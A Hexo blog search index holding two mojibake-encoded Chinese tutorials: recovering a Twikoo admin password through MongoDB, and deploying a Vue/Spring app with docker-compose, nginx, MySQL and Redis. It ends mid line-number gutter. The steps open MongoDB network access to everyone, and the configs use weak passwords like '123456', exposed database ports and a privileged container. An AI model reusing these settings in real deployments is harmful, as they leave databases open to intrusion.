<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Twikooæ‰¾å›æš—å·åŠå¯†ç </title>
      <link href="/posts/bb3290a1/"/>
      <url>/posts/bb3290a1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1>å‰è¨€</h1><p>å“ˆå–½ï¼Œè·ç¦»ä¸Šä¸€ç¯‡æ–‡ç« çš„å‘å¸ƒè¿˜æ˜¯åœ¨ä¸Šæ¬¡ï¼ˆdogeï¼‰å˜»å˜»ï¼Œå…¶å®ä¹Ÿå°±ä¸€å¹´åŠè€Œå·²å•¦ï¼Œæƒ³å‡‘ä¸ªä¸¤å¹´åŠæ¥ç€ï¼ˆåˆ«æ‰“æˆ‘é”™äº†ï¼‰ï¼Œæƒ³æƒ³è¿™ä¸€å¹´ç»å†äº†å¾ˆå¤šï¼Œè€ƒç ”ã€æ‰¾å®ä¹ ã€è®ºæ–‡ã€æ¯•ä¸šï¼Œè¿˜æœ‰å­¦ä¹ â€¦</p><p>å…¶å®ä¸æ˜¯æˆ‘æƒ³é¸½ï¼Œæˆ‘ä¹Ÿä¸€ç›´åœ¨å­¦ä¹ çŠ¶æ€ï¼Œåªæ˜¯å› ä¸ºæ‰¾ä¸åˆ°åˆé€‚å†™çš„ç‚¹ã€‚</p><p>åŠ ä¹‹æˆ‘çš„<strong>ç½‘ç«™å®—æ—¨ï¼šåšæŒåŸåˆ›ï¼Œåå¯¹æŠ„è¢­è½¬è½½</strong>ã€‚å¾ˆå¤šæ–‡ç« ç¡®å®å¾ˆè¯¦ç»†äº†ï¼Œä¹Ÿæ²¡å¿…è¦è¿‡å¤šè§£è¯»ã€è½¬è½½ï¼Œæ¯•ç«Ÿæˆ‘æ·±å—å…¶å®³ã€‚</p><p>å¥½äº†ï¼Œå›åˆ°æ­£é¢˜ï¼Œä»Šå¤©çš„æ–‡ç« æ˜¯å…³äº<code>Twikoo</code>æ‰¾å›æš—å·åŠå¯†ç ï¼Œåˆ«é—®æˆ‘æ€ä¹ˆæƒ³å†™è¿™ä¸ªçš„ï¼Œåˆšæ‘¸ç´¢æ‰¾å›æ¥çš„/(ã„’oã„’)/~~</p><h1>è‡ªèº«éƒ¨ç½²è¯´æ˜</h1><p>æˆ‘çš„<code>Twikoo</code>æ˜¯é€šè¿‡<code>Vercel</code>éƒ¨ç½²çš„ï¼Œä»¥ä¸‹ä¹Ÿæ˜¯é’ˆå¯¹è¿™ä¸ªæƒ…å†µçš„ã€‚</p><p>è¯¦æƒ…è¯·å‰å¾€ ğŸ”—<a href="https://twikoo.js.org/">Twikooæ–‡æ¡£</a></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-1.5qk479lo67g0.jpg" alt="éƒ¨ç½²è¯´æ˜"></p><p>å¯ä»¥çœ‹åˆ°è¯´æ˜ä¸­æåˆ°äº†<code>MongoDB</code>å’Œ<code>Vercel</code>ï¼Œæˆ‘ä»¬ä¸»è¦æ˜¯ä»è¿™ä¸¤æ–¹é¢æ‰¾ã€‚</p><h1>ä¿®æ”¹MongoDBé…ç½®</h1><p>è¿›å…¥<code>MongoDB Atlas</code>ä¸­ï¼Œåœ¨è‡ªå·±åˆ›å»ºçš„é¡¹ç›®ä¸‹</p><p><code>SECURITY</code> &gt; <code>Network Access</code> &gt; <code>Edit</code> &gt;  ä¿®æ”¹ç½‘ç»œå…è®¸ä¸ºæ‰€æœ‰äºº</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-2.jpg" alt="ä¿®æ”¹MongoDBé…ç½®"></p><h1>æŸ¥çœ‹Vercelé…ç½®URI</h1><p>è¿›å…¥è‡ªå·±çš„<code>Vercel</code>ä¸»é¡µé¡µé¢ï¼Œç‚¹å‡»è‡ªå·±ä¹‹å‰æŒ‰ç…§æç¤ºåˆ›å»ºçš„é¡¹ç›®</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-3.jpg" alt="æŸ¥çœ‹Vercelé…ç½®URI-1"></p><p>è¿›å…¥å <code>Settings</code> &gt; <code>Environment Variables</code>ï¼Œæ‰¾åˆ°è‡ªå·±çš„<code>MONGODB_URI</code>ï¼Œå¤åˆ¶<code>URI</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-4.jpg" alt="æŸ¥çœ‹Vercelé…ç½®URI-2"></p><h1>è¿æ¥MongoDB</h1><p>è¿æ¥<code>MongoDB</code>æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><ol><li>MongoDB Compass</li><li>MangoDB for VS Code</li></ol><h2 id="MongoDB-Compass">MongoDB Compass</h2><p>ä¸‹è½½è¯·å‰å¾€ğŸ”—<a href="https://blog.csdn.net/GyaoG/article/details/123468294">MongoDBå¯è§†åŒ–ç®¡ç†å·¥å…·-MongoDB Compass</a></p><p>å°†ä¸Šé¢å¤åˆ¶å¥½çš„<code>URI</code>ç²˜è´´åˆ°<code>URIæ¡†</code>ä¸­ï¼Œä¹‹åè¿æ¥å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-5.jpg" alt="MongoDB Compass"></p><h2 id="MongoDB-for-VS-Code">MongoDB for VS Code</h2><p><code>VScode</code>çš„æ’ä»¶ï¼Œç›´æ¥åœ¨æ‰©å±•ä¸­æœç´¢å®‰è£…å³å¯ã€‚</p><p>æŒ‰ä¸‹å›¾é¡ºåºå°†<code>URI</code>å¤åˆ¶åˆ°æŒ‡å®šæ¡†ä¸­ï¼Œå›è½¦è¿æ¥å³å¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-6.jpg" alt="MangoDB for VS Code"></p><h1>æŸ¥çœ‹MongoDBæ•°æ®</h1><p>ä¸Šé¢ä»»æ„ä¸€ç§æ–¹å¼è¿›å…¥<code>MongoDB</code>ä¸­ï¼Œåœ¨<code>myFirstDatabase</code>ä¸‹çš„<code>configè¡¨</code>ä¸­å¯ä»¥æ‰¾åˆ°å…¨éƒ¨é…ç½®ä¿¡æ¯ï¼Œå¯ä»¥è‡ªè¡ŒæŸ¥çœ‹ä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-7.jpg" alt="æŸ¥çœ‹MongoDBæ•°æ®"></p><p>å…¶ä¸­ï¼Œ<code>ADMIN_PASS</code>æ˜¯è¯„è®ºç®¡ç†çš„å¯†ç ï¼Œ <code>HIDE_ADMIN_CRYPT</code>æ˜¯è¯„è®ºç®¡ç†çš„æš—å·ï¼ˆæ˜¾ç¤ºç®¡ç†å…¥å£çš„ï¼‰</p><div class="note info flat"><p>æ‰‹åŠ¨åˆ é™¤<code>ADMIN_PASS</code>å¯†ç ï¼Œé‡æ–°ç™»å½•twikooå°±å¯ä»¥é‡æ–°é…ç½®å¯†ç äº†</p></div><h1>è¯¾ä½™å°çŸ¥è¯†</h1><p>æ®æµ‹è¯•ï¼Œ<code>ADMIN_PASS</code>çš„åŠ å¯†æ–¹å¼ä¸ºä¸¤å±‚md5åŠ å¯†ï¼Œå³<code>md5(md5(password))</code></p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20230810/twikoo-8.jpg" alt="è¯¾ä½™å°çŸ¥è¯†"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç«™å»ºè®¾ </category>
          
          <category> Twikoo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ®åº“ </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Vercel </tag>
            
            <tag> Twikoo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker-composeéƒ¨ç½²å‰åç«¯é¡¹ç›®</title>
      <link href="/posts/338829e1/"/>
      <url>/posts/338829e1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ä»‹ç»">ä»‹ç»</h2><p>Docker Compose æ˜¯å®˜æ–¹ç¼–æ’çš„é¡¹ç›®ä¹‹ä¸€ï¼Œè´Ÿè´£å¿«é€Ÿçš„éƒ¨ç½²åˆ†å¸ƒå¼åº”ç”¨ã€‚</p><p>ä½¿ç”¨Docker Composeå¯ä»¥è½»æ¾ã€é«˜æ•ˆçš„ç®¡ç†å®¹å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨æˆ·å®šä¹‰å’Œè¿è¡Œå¤šä¸ªå®¹å™¨çš„Dockeråº”ç”¨ç¨‹åºã€‚</p><p>åœ¨Docker Composeä¸­ä½ å¯ä»¥ä½¿ç”¨YAMLæ–‡ä»¶æ¥é…ç½®ä½ çš„åº”ç”¨æœåŠ¡ï¼Œç„¶ååªéœ€è¦ä¸€ä¸ªç®€å•çš„å‘½ä»¤ï¼Œå°±å¯ä»¥åˆ›å»ºå¹¶å¯åŠ¨ä½ é…ç½®çš„æ‰€æœ‰æœåŠ¡ã€‚</p><h2 id="å®éªŒè®¾å¤‡åŠéœ€æ±‚-2">å®éªŒè®¾å¤‡åŠéœ€æ±‚</h2><ul><li><p>å‰åç«¯é¡¹ç›®ä¸€ä»½ï¼ˆVue+springï¼‰</p></li><li><p>Ubuntuï¼ˆå·²è£…dockeråŠdocker-composeï¼‰</p></li></ul><h2 id="ä¸€ã€æ–‡ä»¶ç›®å½•æ€»è§ˆ">ä¸€ã€æ–‡ä»¶ç›®å½•æ€»è§ˆ</h2><p>ç›®å½•æ–‡ä»¶å¤¹å¦‚ä¸‹:</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20220426/%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95.18zcsffav83k.jpg" alt="ç›®å½•æ€»è§ˆ"></p><ul><li><p>å‰ç«¯ï¼šnginxéƒ¨ç½²</p></li><li><p>åç«¯ï¼šJava8ç¯å¢ƒè¿è¡ŒjaråŒ…</p></li><li><p>æ•°æ®åº“ï¼šmysqlã€redis</p></li></ul><div class="note primary no-icon flat"><p>ä¸ºäº†è®©å…¶ä»–åŒå­¦æ›´å¥½çš„ç†è§£åˆ›å»ºè¿‡ç¨‹ï¼Œä»¥åèƒ½å¤Ÿå†™å‡ºé€‚åˆè‡ªå·±çš„ï¼Œä»¥ä¸‹ä¼šåˆ†æ¨¡å—è¿›è¡Œç²—ç•¥è§£é‡Šï¼Œå®Œæ•´ä»£ç å¯è§ç¬¬å…­ç‚¹ã€‚</p></div><h2 id="äºŒã€å‰ç«¯Nginx">äºŒã€å‰ç«¯Nginx</h2><p>å‰ç«¯é¡¹ç›®ä¸­ipåœ°å€æ”¹ä¸º<code>å®¿ä¸»æœºipåœ°å€</code>ï¼Œ<code>npm run build</code>æ‰“åŒ…å‰ç«¯ä»£ç æ”¾å…¥æŒ‡å®šè·¯å¾„ä¸­</p><p><code>docker-compose.yml</code>æ–‡ä»¶ä¸­çš„<code>:</code>ç¬¦å·ï¼Œå‰é¢çš„<code>è·¯å¾„/ç«¯å£</code>è¡¨ç¤ºå®¿ä¸»æœºçš„ï¼ˆè‡ªå®šä¹‰ï¼‰ï¼Œåé¢çš„<code>è·¯å¾„/ç«¯å£</code>è¡¨ç¤ºå®¹å™¨çš„ï¼ˆåŸºæœ¬ä¸ç”¨ä¿®æ”¹ï¼‰</p><p>docker-composeå†…å‰ç«¯æœåŠ¡</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/nginx/nginx.conf:/etc/nginx/nginx.conf</span>   <span class="comment"># nginxé…ç½®æ–‡ä»¶</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/html/dist/:/usr/share/nginx/html/</span>        <span class="comment"># å‰ç«¯æ‰“åŒ…æ–‡ä»¶</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.8</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span>      <span class="comment"># è¿™ä¸ªå¿…é¡»è¦ï¼Œè§£å†³nginxçš„æ–‡ä»¶è°ƒç”¨çš„æƒé™é—®é¢˜</span></span><br></pre></td></tr></table></figure><p>nginx.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;                                                  </span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">            try_files $uri $uri/ /index.html last; # åœ¨åŸæ¥çš„æ–‡ä»¶ä¸­æ·»åŠ è¿™å¥</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä¸‰ã€æ•°æ®åº“Mysqlã€Redis">ä¸‰ã€æ•°æ®åº“Mysqlã€Redis</h2><p>docker-composeå†…æ•°æ®åº“æœåŠ¡</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:8.0.12</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=123456</span>                <span class="comment">#æ•°æ®åº“åˆå§‹è¯ä¸ºrootç”¨æˆ·è®¾ç½®çš„é»˜è®¤å¯†ç </span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=xx</span><span class="comment"># é¡¹ç›®æ•°æ®åº“å</span></span><br><span class="line">      <span class="comment"># - MYSQL_USER:                           #è‡ªå®šä¹‰æ•°æ®åº“çš„ç”¨æˆ·ï¼Œæƒé™åªä½œç”¨äºMYSQL_DATABASEé…ç½®çš„æ•°æ®åº“</span></span><br><span class="line">      <span class="comment"># - MYSQL_PASSWORD:                    #è‡ªå®šä¹‰æ•°æ®åº“çš„ç”¨æˆ·ï¼Œæƒé™åªä½œç”¨äºMYSQL_DATABASEé…ç½®çš„æ•°æ®åº“</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/cnf/my.cnf:/etc/my.cnf</span></span><br><span class="line">      <span class="comment"># - ./config/mysql/data:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/mysql/init/xx.sql:/docker-entrypoint-initdb.d/xx.sql</span><span class="comment"># è‡ªå·±çš„sqlæ–‡ä»¶</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--default-authentication-plugin=mysql_native_password</span> <span class="string">--character-set-server=utf8mb4</span> <span class="string">--collation-server=utf8mb4_unicode_ci</span> <span class="string">--sql-mode=&#x27;&#x27;</span> <span class="string">--max-execution-time=1000</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:latest</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ=Asia/Shanghai</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">REDIS_ROOT_PASSWORD=passwd</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/conf/redis.conf:/etc/redis/redis.conf</span>   <span class="comment">#æŒ‚è½½redis.confä¸ç„¶åç»­é‡å¯rediså¯†ç ä¼šå¤±æ•ˆ</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./config/redis/data:/data</span></span><br><span class="line">      <span class="comment"># - ./config/redis/log/redis.log:/logs/redis.log</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;6379:6379&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">data_security:</span></span><br><span class="line">        <span class="attr">ipv4_address:</span> <span class="number">10.1</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">    <span class="comment"># privileged: true</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">redis-server</span> <span class="string">/etc/redis/redis.conf</span> <span class="string">--requirepass</span> <span class="string">passwd</span>          <span class="comment">#æŒ‡å®šé…ç½®æ–‡ä»¶å¯åŠ¨redis</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>mysqlå‘½ä»¤<code>command</code>ä¸­ï¼š</p><table><thead><tr><th style="text-align:left">å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">â€“default-authentication-plugin=mysql_native_password</td><td>é»˜è®¤çš„èº«ä»½è®¤è¯æ’ä»¶</td></tr><tr><td style="text-align:left">â€“character-set-server=utf8mb4</td><td>å°†MySQLæ•°æ®åº“ç›¸å…³çš„å­—ç¬¦é›†éƒ½è®¾ç½®ä¸ºutf8mb4</td></tr><tr><td style="text-align:left">â€“sql-mode=â€˜â€™</td><td>é»˜è®¤å€¼ä¸ºç©ºï¼Œæ­¤æ—¶MySQLæ‰§è¡Œçš„ä¸ä¸¥æ ¼çš„æ£€æŸ¥</td></tr><tr><td style="text-align:left">â€“max-execution-time=1000</td><td>æœ€å¤§æ‰§è¡Œæ—¶é—´</td></tr></tbody></table><p>ğŸ‘‰é¡¹ç›®ä¸­æ²¡æœ‰é…ç½®redisçš„å¯ä»¥è·³è¿‡äº†ã€‚</p><p>Redisé…ç½®æ–‡ä»¶<code>redis.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span 